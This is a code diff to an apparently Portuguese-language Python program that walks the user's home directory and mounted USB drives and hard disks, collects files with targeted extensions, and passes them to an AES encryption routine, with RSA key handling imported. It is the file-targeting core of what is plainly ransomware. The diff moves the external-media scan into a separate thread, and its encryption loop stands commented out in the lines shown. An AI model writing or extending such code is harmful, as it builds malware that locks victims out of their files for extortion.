@@ -12,6 +12,7 @@ import json
 import subprocess
 import hashlib
 import time
+import threading
 
 from AES import *
 from RSA import *
@@ -103,17 +104,36 @@ NOVAS COISAS :
 def menu(senha_AES):
     tipos_arquivos = file_types.split(' ')
     home = os.environ['HOME'] # /home/user is the start point
-    comeco = time.time()
+    t = threading.Thread(target = listar_media, args=(senha_AES, tipos_arquivos))
+    t.start()
     listar(senha_AES, home, tipos_arquivos)
-    listar_media(senha_AES,tipos_arquivos)
+    #listar_media(senha_AES,tipos_arquivos)
+    while threading.active_count() > 1:
+        pass
 
 # look's for external media such as usb / hd's
 def listar_media(senha_AES, tipos_arq):
-    print('Procurando por pendrives/HDs')
+    encrypt_list = []
+    #print('Procurando por pendrives/HDs')
     caminho = '/media/'+getpass.getuser()
     if(os.path.isdir(caminho)):
-        listar(senha_AES,caminho,tipos_arq)
+        for caminho, diret, arq in os.walk(caminho):
+            for elemento in arq:
+                arq = os.path.join(caminho, elemento)
+                extensao = os.path.splitext(arq)
+                for ext in tipos_arq:
+                    if extensao[1] == ext:
+                        encrypt_list.append(arq)
+                        break
 
+
+    ''' #cripto routine
+        for element in encrypt_list: # encrypt happens here
+            try:
+                criptografa(chave_AES , element)
+            except:
+                print('Error Encrypting file: '+ element)
+    '''
 
 # lists and encrypt files
 def listar(chave_AES,diretorio, tipos_arq):
@@ -134,7 +154,6 @@ def listar(chave_AES,diretorio, tipos_arq):
                     if(extensao[1] == ext): # found file with the extension
                         encrypt_list.append(file_found)
                         break
-
 '''
     for element in encrypt_list: # encrypt happens here
         try:
